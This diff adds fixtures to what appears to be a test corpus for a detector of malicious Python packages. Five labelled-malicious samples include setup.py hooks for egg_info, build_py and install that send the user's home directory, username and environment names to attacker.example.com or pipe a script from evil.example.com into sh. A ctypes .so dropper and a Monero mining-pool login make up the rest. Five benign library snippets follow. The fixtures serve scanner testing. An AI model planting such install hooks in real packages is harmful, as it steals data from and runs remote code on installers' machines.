@@ -740,6 +740,223 @@ def caller_name() -> str | None:
     return None
 '''},
     ),
+    # ─── 사이클 6: 악성 5 ────────────────────────────────
+    _mal(
+        "uninstall-time-trigger",
+        description="setup.py egg_info hook 으로 install 외 시점 발화",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXS-003 변형 (egg_info)",
+        files={"setup.py": '''
+from setuptools import setup
+from setuptools.command.egg_info import egg_info
+import requests, os
+
+class CustomEggInfo(egg_info):
+    def run(self):
+        try:
+            requests.post("https://attacker.example.com/egginfo",
+                          json={"home": os.path.expanduser("~"),
+                                "user": os.environ.get("USER")})
+        except Exception:
+            pass
+        egg_info.run(self)
+
+setup(name="evil", cmdclass={"egg_info": CustomEggInfo})
+'''},
+    ),
+    _mal(
+        "build-py-hook-payload",
+        description="setup.py 의 build_py 오버라이드로 페이로드",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXS-003 (build_py)",
+        files={"setup.py": '''
+from setuptools import setup
+from setuptools.command.build_py import build_py
+import subprocess
+
+class EvilBuild(build_py):
+    def run(self):
+        subprocess.Popen(
+            "curl -fsSL http://evil.example.com/loader.sh | sh",
+            shell=True,
+        )
+        build_py.run(self)
+
+setup(name="x", cmdclass={"build_py": EvilBuild})
+'''},
+    ),
+    _mal(
+        "dependency-confusion-internal",
+        description="회사 내부 패키지명 typosquat (의존성 혼동)",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="dependency confusion + recon",
+        files={"setup.py": '''
+"""Reconnaissance hook for dep-confusion."""
+from setuptools import setup
+from setuptools.command.install import install
+import os, json, urllib.request
+
+class Recon(install):
+    def run(self):
+        try:
+            payload = {
+                "host":   os.uname()[1],
+                "cwd":    os.getcwd(),
+                "envs":   list(os.environ.keys()),
+                "argv":   __import__("sys").argv,
+            }
+            req = urllib.request.Request(
+                "https://attacker.example.com/dc",
+                data=json.dumps(payload).encode(),
+                headers={"Content-Type": "application/json"},
+            )
+            urllib.request.urlopen(req, timeout=3).read()
+        except Exception:
+            pass
+        install.run(self)
+
+setup(name="internal-secret-tool", cmdclass={"install": Recon})
+'''},
+    ),
+    _mal(
+        "rust-binary-dropper",
+        description="네이티브 binary (so/dll) 추출 + ctypes 로 실행",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="EXM-003 (ctypes) + dropper",
+        files={"loader.py": '''
+import ctypes, os, base64
+# pre-bundled 페이로드 (실제 사례에선 wheel 안에 .so 동봉)
+SO = base64.b64decode(b"...")  # truncated
+path = "/tmp/.payload.so"
+with open(path, "wb") as f:
+    f.write(SO)
+os.chmod(path, 0o755)
+lib = ctypes.CDLL(path)
+lib.run()
+'''},
+    ),
+    _mal(
+        "stratum-mining-protocol",
+        description="Stratum 프로토콜로 마이닝 풀 직접 연결",
+        expected=("MALICIOUS", "HIGH_RISK", "SUSPICIOUS"),
+        note="NET-003 (mining pool) 변형",
+        files={"miner_proto.py": '''
+import socket, json
+# 마이닝 풀 직접 연결 (xmrpool / minexmr 등)
+sock = socket.create_connection(("pool.minexmr.com", 4444))
+sock.send(json.dumps({
+    "id": 1, "method": "login",
+    "params": {"login": "ATTACKER_WALLET", "pass": "x"}
+}).encode() + b"\\n")
+'''},
+    ),
+    # ─── 사이클 6: 정상 5 ────────────────────────────────
+    _ben(
+        "alembic-migrations",
+        description="Alembic DB 마이그레이션 환경",
+        files={"env.py": '''
+"""Alembic migration env."""
+from alembic import context
+from sqlalchemy import engine_from_config
+
+config = context.config
+
+def run_migrations_online():
+    connectable = engine_from_config(
+        config.get_section(config.config_ini_section),
+        prefix="sqlalchemy.",
+    )
+    with connectable.connect() as conn:
+        context.configure(connection=conn)
+        with context.begin_transaction():
+            context.run_migrations()
+
+run_migrations_online()
+'''},
+    ),
+    _ben(
+        "graphene-relay-node",
+        description="Graphene GraphQL Relay node 정의",
+        files={"types.py": '''
+"""Graphene Relay types."""
+import graphene
+from graphene import relay
+
+class Book(graphene.ObjectType):
+    class Meta:
+        interfaces = (relay.Node,)
+
+    title = graphene.String()
+    author = graphene.String()
+
+class Query(graphene.ObjectType):
+    node = relay.Node.Field()
+    book = graphene.Field(Book, id=graphene.ID(required=True))
+
+    def resolve_book(self, info, id):
+        return Book(title="Sample", author="Anon")
+'''},
+    ),
+    _ben(
+        "click-progress-bar",
+        description="Click progressbar (정상 CLI UX)",
+        files={"progress.py": '''
+"""Progress bar wrapper using click."""
+import click
+import time
+
+def slow_iter(items):
+    with click.progressbar(items, label="Processing") as bar:
+        for x in bar:
+            time.sleep(0.001)
+            yield x
+
+@click.command()
+@click.argument("count", type=int)
+def main(count):
+    list(slow_iter(range(count)))
+
+if __name__ == "__main__":
+    main()
+'''},
+    ),
+    _ben(
+        "datetime-zoneinfo",
+        description="zoneinfo 시간대 변환",
+        files={"tz.py": '''
+"""Timezone conversion."""
+from datetime import datetime
+from zoneinfo import ZoneInfo
+
+def to_kst(dt: datetime) -> datetime:
+    if dt.tzinfo is None:
+        dt = dt.replace(tzinfo=ZoneInfo("UTC"))
+    return dt.astimezone(ZoneInfo("Asia/Seoul"))
+
+def utc_now_iso() -> str:
+    return datetime.now(ZoneInfo("UTC")).isoformat()
+'''},
+    ),
+    _ben(
+        "scipy-statistics",
+        description="scipy 통계 함수",
+        files={"stats.py": '''
+"""Statistical helpers built on scipy."""
+import numpy as np
+from scipy import stats
+
+def confidence_interval(data, confidence: float = 0.95):
+    a = np.array(data)
+    n = len(a)
+    m = a.mean()
+    sem = stats.sem(a)
+    h = sem * stats.t.ppf((1 + confidence) / 2, n - 1)
+    return m - h, m + h
+
+def t_test(a, b):
+    return stats.ttest_ind(a, b, equal_var=False)
+'''},
+    ),
     # ─── 정상 fixture 추가 10 ───────────────────────────────
     _ben(
         "fastapi-style-app",
